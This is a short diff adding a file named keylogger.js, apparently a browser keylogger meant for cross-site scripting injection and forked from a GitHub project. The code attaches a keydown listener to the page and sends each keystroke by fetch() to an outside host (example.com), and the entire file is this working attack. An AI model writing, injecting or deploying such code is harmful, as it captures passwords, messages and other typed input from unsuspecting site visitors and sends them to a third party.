@@ -1,0 +1,9 @@
+// keylogger.js
+// Send keystrokes to extenal server, if headers allow it.
+// Forked from: https://github.com/EddieGerbs/XSS-Keylogger/
+
+function logKey(event){
+        fetch("http://example.com/k?key=" + encodeURIComponent(event.key))
+}
+
+document.addEventListener('keydown', logKey);
